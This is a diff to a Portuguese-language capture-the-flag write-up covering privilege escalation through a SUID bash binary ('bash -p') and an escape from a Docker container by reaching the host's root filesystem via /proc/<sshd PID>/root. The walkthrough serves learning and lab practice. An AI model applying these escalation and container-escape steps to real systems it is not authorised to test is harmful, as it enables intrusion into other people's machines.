@@ -145,11 +145,30 @@ stty raw -echo; fg
 ```bash
 find / -perm /4000 2>/dev/null
 ```
+![Descrição da imagem](./images/31.png)
+
 ## Ao analisar a saída, observamos que temos permissão para executar o bash com privilégios elevados. Com isso, conseguimos obter acesso root ao executar o seguinte comando:
 ```bash
 bash -p
 ```
 
 ## Com isso conseguimos pegar a flag de user no diretório /root.
+![Descrição da imagem](./images/32.png)
 
+## Após uma análise detalhada para escalonamento de privilégios, identificamos que a máquina host estava compartilhando os processos com o contêiner Docker. Observamos os processos da máquina host e utilizamos o ID do processo (PID) do SSH para escalar privilégios no host principal, conseguindo assim escapar do contêiner. O processo identificado foi:
+
+### root 1462 0.0 0.4 12020 8064 ? Ss 17:57 0 /usr/sbin/sshd -D -o AuthorizedKeysCommand /usr/share/ec2-instaneic_run_authorized_keys %u %f -o AuthorizedKeysCommandUser ec2-i listene
+
+## Com o comando /proc/1462/root , conseguimos acessar o diretório raiz do host principal.
+### cd /proc/1462/root
+
+![Descrição da imagem](./images/33.png)
+![Descrição da imagem](./images/34.png)
+
+## Agora podemos acessar o diretório root do host principal e capturar nossa última flag.
+![Descrição da imagem](./images/34.png)
+
+**Autor:** [felipeluan20](https://github.com/felipeluan20)  
+**Plataforma:** CTF Write-ups  
+**Missão:** Compreender, explorar e documentar.
 
